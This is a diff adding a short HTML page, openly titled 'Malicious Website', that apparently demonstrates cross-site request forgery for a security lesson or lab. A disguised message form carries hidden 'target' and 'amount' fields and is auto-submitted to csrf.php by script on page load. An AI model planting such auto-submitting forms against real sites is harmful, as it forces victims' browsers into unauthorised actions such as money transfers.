@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious Website</title>
+</head>
+<body>
+<form id="maliciousForm" method="post" action="csrf.php">
+    <table style="border-collapse: collapse; border: none; width: 30vw;">
+        <tr>
+            <td><textarea style="width: 100%;" name="message" placeholder="Enter you message here..."></textarea>
+            </td>
+        </tr>
+        <tr>
+            <td style="text-align: center;"><input type="submit" value="Send message"/></td>
+        </tr>
+    </table>
+    <input type="hidden" name="target" value="my-very-best-account"/>
+    <input type="hidden" name="amount" value="one million dollars"/>
+</form>
+<script>
+    document.getElementById('maliciousForm').submit();
+</script>
+</body>
+</html>
